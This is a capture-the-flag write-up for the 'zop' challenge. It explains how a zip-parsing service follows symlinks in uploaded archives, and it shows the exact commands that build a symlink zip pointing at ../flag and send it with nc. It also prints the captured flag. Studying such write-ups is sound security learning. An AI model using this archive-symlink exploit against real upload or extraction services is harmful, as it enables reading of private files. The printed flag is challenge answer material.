# zop \[464 Points] (16 Solves)
```
ZAP ZIP ZOP ZAB ZIB ZOB... im just trying to overwhelm you with useless code.

nc 172.210.129.230 1349 
```
Attached is [zop][./zop]
---

**TL;DR:** \
A **ZIP Symlink Vulnerability**. The server reads a base64 encoded zip file and
prints the content of the files. \
We can create a zip with a symlink `../flag` and upload it to the server.
```sh
ln -s ../flag file
zip --symlink zip.zip ./file
base64 -w 0 zip.zip | nc 172.210.129.230 1349
```

## Writeup

We are given a set of source codes for the service, which contains a bunch
of code implementing base64 and zip parsing.

Reading the `pkzip.c` file, which parses the zip we find this code
```c
filename = malloc(strlen("content/") + lfh->fname_len + 1);
memcpy(filename, "content/", strlen("content/") + 1);
memcpy(filename + strlen("content/"), lfh->filename, strlen(lfh->filename));
```

It would allow us to write out of bounds by zipping something like `../file`
however we need to read `../flag`. (The `..` because as you can see the files
are places in `content/`). \
Well, this sounds like a task for a symlink. Let's look at the code
```c
fd = open(filename, O_WRONLY | O_CREAT, 0644);
if (fd < 0){
    printf("%s :%m\n", lfh->filename);
    return (NULL);
} else {
    write(fd, content, lfh->uncompressed_size);
    close(fd);
}
```

It doesn't look like there's anything stopping us from unzipping a symlink. \
Then main just reads all of the returned files
```c
files = extract_zip(zip_file, read_size);
// printing the content of the files
while (files[++i] != NULL){
    printf("-- %s \n", files[i]);
    fd = open(files[i], O_RDONLY, 0644);
    // - snip -
    read(fd, zip_file, read_size);
    zip_file[read_size] = '\0';
    printf("------------------------------------------------------------------------\n\n");
    printf("%s\n", zip_file);
    printf("------------------------------------------------------------------------\n\n");
}
```

After create the zip file with the symlink and sending it to the server,
we get the flag
```sh
$ ln -s ../flag file
$ zip --symlink zip.zip ./file
$ base64 -w 0 zip.zip | nc 172.210.129.230 1349

include your zip file (base64)>> UEsDBAoAAAAAAJxMyFh5zQKiCwAAAAsAAAAEABwAZmlsZVVUCQADB/xjZgf8Y2Z1eAsAAQToAwAABOkDAAAuLi9mbGFnLnR4dFBLAQIeAwoAAAAAAJxMyFh5zQKiCwAAAAsAAAAEABgAAAAAAAAAAAD/oQAAAABmaWxlVVQFAAMH/GNmdXgLAAEE6AMAAATpAwAAUEsFBgAAAAABAAEASgAAAEkAAAAAAA==
-- content/file 
------------------------------------------------------------------------

AKASEC{I7_wa5_700_0BVi0u5_ri9H7?}

------------------------------------------------------------------------
```

And now I will remind you that only 16 teams out of the almost 700 participating (including us) solved it.
Yeah.

**Flag:** `AKASEC{I7_wa5_700_0BVi0u5_ri9H7?}`
